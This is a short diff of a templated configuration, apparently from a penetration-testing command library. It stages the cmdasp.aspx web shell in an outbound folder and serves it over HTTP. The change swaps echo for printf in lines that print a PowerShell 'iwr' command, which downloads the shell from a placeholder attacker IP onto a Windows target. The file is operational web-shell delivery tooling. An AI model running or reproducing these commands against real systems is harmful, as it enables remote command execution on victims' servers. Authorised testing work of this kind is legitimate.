@@ -7,8 +7,8 @@ metadata:
 
 content: |
   mkdir -p packstation/outbound; cp -n /usr/share/webshells/aspx/cmdasp.aspx packstation/outbound; \
-  echo '================================================================'; \
-  echo '                      -----PowerShell-----                      '; \
-  echo 'Deliver only: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/cmdasp.aspx -Outfile {{ delivery_path_windows }}\cmdasp.aspx'; \
-  echo '================================================================'; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                      -----PowerShell-----                      '; \
+  printf '%s\n' 'Deliver only: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/cmdasp.aspx -Outfile {{ delivery_path_windows }}\cmdasp.aspx'; \
+  printf '%s\n' '================================================================'; \
   python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
